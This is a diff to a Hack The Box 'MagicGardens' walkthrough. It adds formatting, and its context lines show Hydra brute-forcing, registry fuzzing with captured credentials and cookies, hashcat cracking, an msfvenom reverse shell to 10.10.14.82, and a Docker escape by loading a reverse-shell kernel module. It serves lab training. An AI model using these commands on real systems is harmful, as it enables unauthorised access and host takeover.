@@ -29,7 +29,7 @@ Add magicgardens.htb to /etc/hosts
 ![image3](../resources/1090b253fea2428fa3c302e545ce0023.png)
 
 - **<u>Port 5000:</u>**
-<https://magicgardens.htb:5000/v2/>
+https://magicgardens.htb:5000/v2/
 
 
 ![image4](../resources/5b27ccb219c343cd91ba0f749349e2b3.png)
@@ -130,6 +130,7 @@ Which means the base64 translates to **username:password**
 ![image15](../resources/f1428a2d68ca4d0db993339e0ada88da.png)
 
 - We can bruteforce this with Hydra:
+
 ```bash
 hydra -I -l alex -P /usr/share/wordlists/rockyou.txt "magicgardens.htb" https-get "/v2/" -s 5000
 
@@ -152,8 +153,9 @@ We get **alex:diamonds**
 <https://logicbomb.medium.com/docker-registries-and-their-secrets-47147106e09>
 
 - Tried to FUZZ the endpoint:
+
 ```bash
-ffuf -u " <https://magicgardens.htb:5000/v2/FUZZ>" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -H 'Authorization: Basic YWxleDpkaWFtb25kcw==' -H 'Cookie: csrftoken=XvaGn6Z10eWZENLXj1Q9j7VIuHcirTiY; sessionid=.eJxrYJ0awQABtVM0ejjLM4sz4nMyi0um9DBM6eEBc5PzS_NKUoumZDD1cCYnFpVA5IE8HjAPSZqruDQpPjG5JDM_b0oPi1tiZs6UUj0AnTMkBg:1s92TI:4SVKEMoje0gSFSmJg6j-LJrBAOQ-YB3chrMB3f3VBco' -fs 0
+ffuf -u " https://magicgardens.htb:5000/v2/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -H 'Authorization: Basic YWxleDpkaWFtb25kcw==' -H 'Cookie: csrftoken=XvaGn6Z10eWZENLXj1Q9j7VIuHcirTiY; sessionid=.eJxrYJ0awQABtVM0ejjLM4sz4nMyi0um9DBM6eEBc5PzS_NKUoumZDD1cCYnFpVA5IE8HjAPSZqruDQpPjG5JDM_b0oPi1tiZs6UUj0AnTMkBg:1s92TI:4SVKEMoje0gSFSmJg6j-LJrBAOQ-YB3chrMB3f3VBco' -fs 0
 
 ```
 
@@ -175,6 +177,7 @@ ffuf -u " <https://magicgardens.htb:5000/v2/FUZZ>" -w /usr/share/wordlists/secli
 ![image22](../resources/a1f54dd12a534375bc5f5a98744b7051.png)
 
 - Extract all the images:
+
 ```bash
 for file in *.tar.gz; do
     tar -xzf "$file" -C extracted/
@@ -197,6 +200,7 @@ done
 ![image26](../resources/3b19f9fa3acf420ba6560a0901470225.png)
 
 - And this is crackable with hashcat:
+
 ```bash
 hashcat -a 0 -m 10000 admin_hash.txt /usr/share/wordlists/rockyou.txt
 
@@ -290,6 +294,7 @@ Copy both these values into the settings.json file of the exploit
 - Get shell:
 
 - Create msfvenom:
+
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f elf -o reverse.elf
 ```
@@ -330,6 +335,7 @@ How to do it:
 - Atm we are root in the docker container - so the only logical thing to do would be to try and break out of the docker and into the host machine
 
 - Checking capabilities:
+
 ```bash
 capsh --print
 
@@ -341,6 +347,7 @@ capsh --print
 
 **<u>To exploit:</u>**
 - First look at the current modules available:
+
 ```bash
 ls /lib/modules
 
@@ -355,7 +362,7 @@ In order to abuse this, lets create a fake lib/modules folder:
 ```bash
 mkdir lib/modules -p
 
-cp -a /lib/modules/6.1.0-20-amd64/ lib/modules/\$(uname -r)
+cp -a /lib/modules/6.1.0-20-amd64/ lib/modules/$(uname -r)
 
 ```
 - Create the **reverse-shell.c** file:
@@ -423,16 +430,19 @@ make
 ![image51](../resources/9782752afd9a4dd1b42be9cdd07b0f40.png)
 
 - Copy to the fake lib folder:
+
 ```bash
-cp reverse-shell.ko lib/modules/\$(uname -r)/
+cp reverse-shell.ko lib/modules/$(uname -r)/
 
 ```
 - Set up nc listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 4444
 
 ```
 - In the current folder (where the Makefile is) run:
+
 ```bash
 insmod reverse-shell.ko
 
